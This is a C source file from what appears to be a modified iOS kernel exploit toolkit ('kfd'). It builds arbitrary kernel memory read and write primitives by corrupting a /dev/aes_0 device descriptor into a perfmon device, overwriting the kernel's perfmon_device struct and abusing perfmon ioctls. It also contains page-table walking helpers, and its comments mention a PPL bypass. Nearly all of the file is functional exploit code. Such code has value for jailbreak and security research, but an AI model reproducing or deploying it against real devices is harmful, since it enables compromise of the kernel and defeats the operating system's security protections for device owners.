/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 * Modified: Removed Swift dependencies, using C patchfinder (libdimentio)
 */

#include "perf.h"
#include <os/log.h>
#include <string.h>
#include <errno.h>

uint64_t kaddr_vn_kqfilter = 0;
uint64_t kaddr_vm_pages = 0;
uint64_t kaddr_vm_page_array_beginning = 0;
uint64_t kaddr_vm_page_array_ending = 0;
uint64_t kaddr_vm_first_phys_ppnum = 0;
uint64_t kaddr_cdevsw = 0;
uint64_t kaddr_perfmon_dev_open = 0;
uint64_t kaddr_ptov_table = 0;
uint64_t kaddr_gPhysBase = 0;
uint64_t kaddr_gPhysSize = 0;
uint64_t kaddr_gVirtBase = 0;
uint64_t kaddr_perfmon_devices = 0;
void *fugufinderbridge = 0;

void perf_init(struct kfd* kfd)
{
    char hw_model[16] = {};
    uintptr_t size = sizeof(hw_model);
    assert_bsd(sysctlbyname("hw.model", hw_model, &size, NULL, 0));
    print_string(hw_model);

    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    // NOTE: Patchfinding is now done AFTER info_run() in kopen(),
    // because the C patchfinder (libdimentio) requires kernel R/W.
}

void perf_kread(struct kfd* kfd, uint64_t kaddr, void* uaddr, uint64_t size)
{
    kfd_assert((size != 0) && (size <= UINT16_MAX));
    kfd_assert(kfd->perf.shared_page.uaddr);
    kfd_assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (uint16_t)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (uint16_t)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, uint64_t kaddr, uint64_t size)
{
    kfd_assert((size != 0) && ((size % sizeof(uint64_t)) == 0));
    kfd_assert(kfd->perf.shared_page.uaddr);
    kfd_assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    uint64_t source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    uint64_t event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (uint64_t i = 0; i < (size / sizeof(uint64_t)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(uint64_t)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        uint64_t kvalue = ((volatile uint64_t*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_ptov(struct kfd* kfd)
{
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_ptov: ENTER");
    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    uint64_t ptov_table_kaddr = kaddr_ptov_table + kfd->info.kernel.kernel_slide;
    kread_kfd((uint64_t)(kfd), ptov_table_kaddr, &kfd->info.kernel.ptov_table, sizeof(kfd->info.kernel.ptov_table));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] ptov_table read OK");

    uint64_t gVirtBase_kaddr = kaddr_gVirtBase + kfd->info.kernel.kernel_slide;
    kread_kfd((uint64_t)(kfd), gVirtBase_kaddr, &kfd->info.kernel.gVirtBase, sizeof(kfd->info.kernel.gVirtBase));

    uint64_t gPhysBase_kaddr = kaddr_gPhysBase + kfd->info.kernel.kernel_slide;
    kread_kfd((uint64_t)(kfd), gPhysBase_kaddr, &kfd->info.kernel.gPhysBase, sizeof(kfd->info.kernel.gPhysBase));

    uint64_t gPhysSize_kaddr = kaddr_gPhysSize + kfd->info.kernel.kernel_slide;
    kread_kfd((uint64_t)(kfd), gPhysSize_kaddr, &kfd->info.kernel.gPhysSize, sizeof(kfd->info.kernel.gPhysSize));

    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] gVirtBase=0x%llx gPhysBase=0x%llx gPhysSize=0x%llx",
           kfd->info.kernel.gVirtBase, kfd->info.kernel.gPhysBase, kfd->info.kernel.gPhysSize);

    kfd_assert(kfd->info.kernel.current_pmap);
    uint64_t ttbr0_va_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, tte);
    uint64_t ttbr0_pa_kaddr = kfd->info.kernel.current_pmap + static_offsetof(pmap, ttep);
    kread_kfd((uint64_t)(kfd), ttbr0_va_kaddr, &kfd->info.kernel.ttbr[0].va, sizeof(kfd->info.kernel.ttbr[0].va));
    kread_kfd((uint64_t)(kfd), ttbr0_pa_kaddr, &kfd->info.kernel.ttbr[0].pa, sizeof(kfd->info.kernel.ttbr[0].pa));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] ttbr0: va=0x%llx pa=0x%llx",
           kfd->info.kernel.ttbr[0].va, kfd->info.kernel.ttbr[0].pa);
    kfd_assert(phystokv(kfd, kfd->info.kernel.ttbr[0].pa) == kfd->info.kernel.ttbr[0].va);

    kfd_assert(kfd->info.kernel.kernel_pmap);
    uint64_t ttbr1_va_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, tte);
    uint64_t ttbr1_pa_kaddr = kfd->info.kernel.kernel_pmap + static_offsetof(pmap, ttep);
    kread_kfd((uint64_t)(kfd), ttbr1_va_kaddr, &kfd->info.kernel.ttbr[1].va, sizeof(kfd->info.kernel.ttbr[1].va));
    kread_kfd((uint64_t)(kfd), ttbr1_pa_kaddr, &kfd->info.kernel.ttbr[1].pa, sizeof(kfd->info.kernel.ttbr[1].pa));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] ttbr1: va=0x%llx pa=0x%llx",
           kfd->info.kernel.ttbr[1].va, kfd->info.kernel.ttbr[1].pa);
    kfd_assert(phystokv(kfd, kfd->info.kernel.ttbr[1].pa) == kfd->info.kernel.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_ptov: DONE, shared_page paddr=0x%llx kaddr=0x%llx",
           kfd->perf.shared_page.paddr, kfd->perf.shared_page.kaddr);
}

void perf_run(struct kfd* kfd)
{
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_run: ENTER");
    uint64_t kernel_base = 0xFFFFFFF007004000 + kfd->info.kernel.kernel_slide;

    uint32_t mh_header[2] = {};
    mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
    mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] mh_header: 0x%x 0x%x", mh_header[0], mh_header[1]);
    kfd_assert(mh_header[0] == 0xfeedfacf);
    kfd_assert(mh_header[1] == 0x0100000c);

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */

    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] /dev/aes_0 fd=%d (errno=%d)", kfd->perf.dev.fd, errno);
    if (kfd->perf.dev.fd < 0) {
        os_log_error(OS_LOG_DEFAULT, "[kfd-perf] WARNING: /dev/aes_0 open failed (%s). "
                     "Previous run may have corrupted device. Falling back to sem_open kread/kwrite.",
                     strerror(errno));
        // Still set up vtophys/phystokv (needed for DMA PPL bypass)
        perf_ptov(kfd);
        os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_ptov OK (no perfmon), perf_run returning early");
        return;
    }

    kfd_assert(kfd->info.kernel.current_proc);
    uint64_t fd_ofiles_kaddr = kfd->info.kernel.current_proc + dynamic_offsetof(proc, p_fd_fd_ofiles);
    uint64_t fd_ofiles = 0;
    kread_kfd((uint64_t)(kfd), fd_ofiles_kaddr, &fd_ofiles, sizeof(fd_ofiles));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] fd_ofiles=0x%llx", fd_ofiles);

    uint64_t fileproc_kaddr = unsign_kaddr(fd_ofiles) + (kfd->perf.dev.fd * sizeof(uint64_t));
    uint64_t fileproc = 0;
    kread_kfd((uint64_t)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));

    uint64_t fp_glob_kaddr = fileproc + static_offsetof(fileproc, fp_glob);
    uint64_t fp_glob = 0;
    kread_kfd((uint64_t)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));

    uint64_t fg_data_kaddr = unsign_kaddr(fp_glob) + static_offsetof(fileglob, fg_data);
    uint64_t fg_data = 0;
    kread_kfd((uint64_t)(kfd), fg_data_kaddr, &fg_data, sizeof(fg_data));

    uint64_t v_specinfo_kaddr = unsign_kaddr(fg_data) + 0x0078;
    uint64_t v_specinfo = 0;
    kread_kfd((uint64_t)(kfd), v_specinfo_kaddr, &v_specinfo, sizeof(v_specinfo));

    kfd->perf.dev.si_rdev_kaddr = unsign_kaddr(v_specinfo) + 0x0018;
    kread_kfd((uint64_t)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] si_rdev_kaddr=0x%llx, si_rdev=[0x%x, 0x%x]",
           kfd->perf.dev.si_rdev_kaddr, kfd->perf.dev.si_rdev_buffer[0], kfd->perf.dev.si_rdev_buffer[1]);

    uint64_t cdevsw_kaddr = kaddr_cdevsw + kfd->info.kernel.kernel_slide;
    uint64_t perfmon_dev_open_kaddr = kaddr_perfmon_dev_open + kfd->info.kernel.kernel_slide;
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] scanning cdevsw at 0x%llx for perfmon_dev_open=0x%llx",
           cdevsw_kaddr, perfmon_dev_open_kaddr);
    uint64_t cdevsw[14] = {};
    uint32_t dev_new_major = 0;
    for (uint64_t dmaj = 0; dmaj < 64; dmaj++) {
        uint64_t kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread_kfd((uint64_t)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        uint64_t d_open = unsign_kaddr(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            os_log_error(OS_LOG_DEFAULT, "[kfd-perf] found perfmon at dmaj=%llu, dev_new_major=0x%x", dmaj, dev_new_major);
            break;
        }
    }

    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] dev_new_major=0x%x (expect 0x11000000)", dev_new_major);
    kfd_assert(dev_new_major == 0x11000000);

    uint32_t new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] writing si_rdev: [0x%x, 0x%x]", new_si_rdev_buffer[0], new_si_rdev_buffer[1]);
    kwrite_kfd((uint64_t)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] si_rdev written OK, calling perf_ptov...");

    perf_ptov(kfd);
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_ptov OK, shared_page kaddr=0x%llx", kfd->perf.shared_page.kaddr);

    struct perfmon_device perfmon_device = {};
    uint64_t perfmon_device_kaddr = kaddr_perfmon_devices + kfd->info.kernel.kernel_slide;
    uint8_t* perfmon_device_uaddr = (uint8_t*)(&perfmon_device);
    kread_kfd((uint64_t)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perfmon_device mutex[0]=0x%llx (expect mask 0x0000000022000000)",
           perfmon_device.pmdv_mutex[0]);
    kfd_assert((perfmon_device.pmdv_mutex[0] & 0xffffff00ffffffff) == 0x0000000022000000);

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[4] = 0;
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(uint64_t));
    ((volatile uint32_t*)(perfmon_device_uaddr))[5] = 0;
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(uint64_t));
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(uint64_t));
    kwrite_kfd((uint64_t)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(uint64_t));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_free: ENTER, restoring si_rdev via perfmon kwrite");
    // CRITICAL FIX: Use perfmon-based kwrite (still active) to restore device descriptor
    // BEFORE restoring sem_open ops. After puaf_cleanup, PUAF pages are reclaimed
    // so sem_open-based kwrite would corrupt kernel memory.
    kwrite_kfd((uint64_t)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_free: si_rdev restored OK");

    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
    os_log_error(OS_LOG_DEFAULT, "[kfd-perf] perf_free: DONE");
}

/*
 * Helper perf functions.
 */

uint64_t phystokv(struct kfd* kfd, uint64_t pa)
{
    const uint64_t PTOV_TABLE_SIZE = 8;
    const uint64_t gVirtBase = kfd->info.kernel.gVirtBase;
    const uint64_t gPhysBase = kfd->info.kernel.gPhysBase;
    const uint64_t gPhysSize = kfd->info.kernel.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->info.kernel.ptov_table[0];

    for (uint64_t i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

    kfd_assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

uint64_t vtophys(struct kfd* kfd, uint64_t va)
{
    const uint64_t ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const uint64_t LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    uint64_t pa = 0;
    uint64_t tt_kaddr = (va >> 63) ? kfd->info.kernel.ttbr[1].va : kfd->info.kernel.ttbr[0].va;

    for (uint64_t cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        uint64_t offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        uint64_t tte_index = (va & index_mask) >> shift;
        uint64_t tte_kaddr = tt_kaddr + (tte_index * sizeof(uint64_t));
        uint64_t tte = 0;
        kread_kfd((uint64_t)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}
